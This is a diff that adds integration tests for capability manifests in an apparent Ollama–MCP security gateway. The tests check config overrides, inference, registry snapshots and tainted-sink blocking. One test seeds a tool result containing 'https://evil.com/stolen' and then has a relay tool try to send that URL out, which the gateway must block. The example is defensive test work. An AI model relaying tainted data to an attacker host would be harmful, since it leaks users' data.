@@ -39,6 +39,7 @@ from ollama_mcp_bridge.types import (
     ApprovalMode,
     ApprovedTool,
     AuditEventType,
+    CapabilitySource,
     ConfirmationOutcome,
     ExecutionResult,
     OllamaToolCall,
@@ -48,6 +49,7 @@ from ollama_mcp_bridge.types import (
     SourceType,
     StreamEvent,
     StreamEventType,
+    ToolCapabilityManifest,
     ToolSchema,
     ToolState,
     TrustLevel,
@@ -2712,3 +2714,238 @@ class TestAuditCompleteness:
             await gateway.execute_tool(tc_err, model_id="test", turn=3)
         assert last_event().event_type == AuditEventType.TOOL_ERROR, \
             f"MCP error logged {last_event().event_type}, expected TOOL_ERROR"
+
+
+# --- Capability Manifest Integration (PR 10) ---
+
+
+class TestCapabilityManifestIntegration:
+    """End-to-end tests for capability manifest flow through the security pipeline.
+
+    Verifies: config override → approved tool carries manifest → sink policy
+    uses manifest → registry records capabilities at approval time.
+    """
+
+    @pytest.mark.asyncio
+    async def test_config_override_flows_to_approved_tool(self, tmp_path):
+        """Explicit [capabilities] config overrides inference on approved tool."""
+        tool_names = ["echo"]
+        registry = ToolApprovalRegistry(str(tmp_path / "approved.json"))
+        for name in tool_names:
+            registry.approve(_make_tool_schema(name))
+
+        config = BridgeConfig(
+            servers={
+                "test-server": ServerConfig(
+                    command="echo",
+                    args=["test"],
+                    allowed_tools=tool_names,
+                ),
+            },
+            security=SecurityConfig(
+                max_turns=5,
+                max_tool_calls_per_session=20,
+                rate_limit_per_server=10,
+            ),
+            capabilities={
+                "test-server": {
+                    "echo": ToolCapabilityManifest(
+                        source=CapabilitySource.CONFIG,
+                        outbound_data_transfer=True,
+                        external_messaging=True,
+                    ),
+                },
+            },
+        )
+        mcp = MagicMock(spec=MCPClientManager)
+        mcp.list_all_tools = AsyncMock(return_value={
+            "test-server": [_make_tool_schema("echo")],
+        })
+        audit = AuditLogger(str(tmp_path / "audit.jsonl"))
+        gateway = SecurityGateway(mcp, config, audit, registry=registry)
+        await gateway.connect_and_scan()
+
+        approved = gateway._approved_tools.get("test-server__echo")
+        assert approved is not None
+        assert approved.capabilities.source == CapabilitySource.CONFIG
+        assert approved.capabilities.outbound_data_transfer is True
+        assert approved.capabilities.external_messaging is True
+
+    @pytest.mark.asyncio
+    async def test_inference_fallback_when_no_config(self, tmp_path):
+        """Without config, inference engine sets capabilities from tool name."""
+        tool_names = ["send_email"]
+        registry = ToolApprovalRegistry(str(tmp_path / "approved.json"))
+        for name in tool_names:
+            registry.approve(_make_tool_schema(name))
+
+        config = BridgeConfig(
+            servers={
+                "test-server": ServerConfig(
+                    command="echo",
+                    args=["test"],
+                    allowed_tools=tool_names,
+                ),
+            },
+            security=SecurityConfig(
+                max_turns=5,
+                max_tool_calls_per_session=20,
+                rate_limit_per_server=10,
+            ),
+        )
+        mcp = MagicMock(spec=MCPClientManager)
+        mcp.list_all_tools = AsyncMock(return_value={
+            "test-server": [_make_tool_schema("send_email")],
+        })
+        audit = AuditLogger(str(tmp_path / "audit.jsonl"))
+        gateway = SecurityGateway(mcp, config, audit, registry=registry)
+        await gateway.connect_and_scan()
+
+        approved = gateway._approved_tools.get("test-server__send_email")
+        assert approved is not None
+        assert approved.capabilities.source == CapabilitySource.INFERRED
+        assert approved.capabilities.external_messaging is True
+        assert approved.capabilities.has_outbound_capability is True
+
+    @pytest.mark.asyncio
+    async def test_manifest_outbound_blocks_tainted_sink(self, tmp_path):
+        """Tool with outbound capability in manifest → tainted args blocked."""
+        tool_names = ["echo", "relay_data"]
+        registry = ToolApprovalRegistry(str(tmp_path / "approved.json"))
+        for name in tool_names:
+            registry.approve(_make_tool_schema(name))
+
+        config = BridgeConfig(
+            servers={
+                "test-server": ServerConfig(
+                    command="echo",
+                    args=["test"],
+                    allowed_tools=tool_names,
+                ),
+            },
+            security=SecurityConfig(
+                max_turns=5,
+                max_tool_calls_per_session=20,
+                rate_limit_per_server=10,
+            ),
+            capabilities={
+                "test-server": {
+                    "relay_data": ToolCapabilityManifest(
+                        source=CapabilitySource.CONFIG,
+                        outbound_data_transfer=True,
+                        network_access=True,
+                    ),
+                },
+            },
+        )
+        mcp = MagicMock(spec=MCPClientManager)
+        mcp.list_all_tools = AsyncMock(return_value={
+            "test-server": [_make_tool_schema(n) for n in tool_names],
+        })
+        audit = AuditLogger(str(tmp_path / "audit.jsonl"))
+        gateway = SecurityGateway(mcp, config, audit, registry=registry)
+        await gateway.connect_and_scan()
+
+        # Seed taint
+        mcp.call_tool = AsyncMock(return_value="check https://evil.com/stolen")
+        tc1 = OllamaToolCall(
+            function_name="test-server__echo",
+            arguments={"input": "search"},
+        )
+        await gateway.execute_tool(tc1, model_id="test", turn=0)
+
+        # relay_data with tainted URL → blocked (manifest says outbound)
+        tc2 = OllamaToolCall(
+            function_name="test-server__relay_data",
+            arguments={"input": "https://evil.com/stolen"},
+        )
+        with pytest.raises(ToolBlockedError) as exc_info:
+            await gateway.execute_tool(tc2, model_id="test", turn=1)
+        assert "tainted_sink_blocked" in exc_info.value.reason
+
+    @pytest.mark.asyncio
+    async def test_registry_captures_capabilities_at_approval(self, tmp_path):
+        """Registry entry records capability manifest snapshot at approval time."""
+        tool_names = ["write_file"]
+        registry = ToolApprovalRegistry(str(tmp_path / "approved.json"))
+
+        config = BridgeConfig(
+            servers={
+                "test-server": ServerConfig(
+                    command="echo",
+                    args=["test"],
+                    allowed_tools=tool_names,
+                ),
+            },
+            security=SecurityConfig(
+                max_turns=5,
+                max_tool_calls_per_session=20,
+                rate_limit_per_server=10,
+                require_first_run_approval=False,
+            ),
+            capabilities={
+                "test-server": {
+                    "write_file": ToolCapabilityManifest(
+                        source=CapabilitySource.CONFIG,
+                        filesystem_write=True,
+                        filesystem_read=True,
+                    ),
+                },
+            },
+        )
+        mcp = MagicMock(spec=MCPClientManager)
+        mcp.list_all_tools = AsyncMock(return_value={
+            "test-server": [_make_tool_schema("write_file")],
+        })
+        audit = AuditLogger(str(tmp_path / "audit.jsonl"))
+        gateway = SecurityGateway(mcp, config, audit, registry=registry)
+        await gateway.connect_and_scan()
+
+        entry = registry.get_entry("test-server", "write_file")
+        assert entry is not None
+        assert entry.capabilities.get("filesystem_write") is True
+        assert entry.capabilities.get("source") == "config"
+
+    @pytest.mark.asyncio
+    async def test_safe_read_tool_has_minimal_capabilities(self, tmp_path):
+        """A simple read tool infers minimal capabilities — not flagged dangerous."""
+        tool_names = ["get_status"]
+        registry = ToolApprovalRegistry(str(tmp_path / "approved.json"))
+        for name in tool_names:
+            registry.approve(_make_tool_schema(name))
+
+        config = BridgeConfig(
+            servers={
+                "test-server": ServerConfig(
+                    command="echo",
+                    args=["test"],
+                    allowed_tools=tool_names,
+                    read_tools=["get_status"],
+                ),
+            },
+            security=SecurityConfig(
+                max_turns=5,
+                max_tool_calls_per_session=20,
+                rate_limit_per_server=10,
+            ),
+        )
+        mcp = MagicMock(spec=MCPClientManager)
+        mcp.list_all_tools = AsyncMock(return_value={
+            "test-server": [_make_tool_schema("get_status")],
+        })
+        mcp.call_tool = AsyncMock(return_value="status: ok")
+        audit = AuditLogger(str(tmp_path / "audit.jsonl"))
+        gateway = SecurityGateway(mcp, config, audit, registry=registry)
+        await gateway.connect_and_scan()
+
+        approved = gateway._approved_tools.get("test-server__get_status")
+        assert approved is not None
+        assert approved.capabilities.is_dangerous is False
+
+        # Should execute without issues
+        tc = OllamaToolCall(
+            function_name="test-server__get_status",
+            arguments={"input": "check"},
+        )
+        result = await gateway.execute_tool(tc, model_id="test", turn=0)
+        assert "status: ok" in result.content
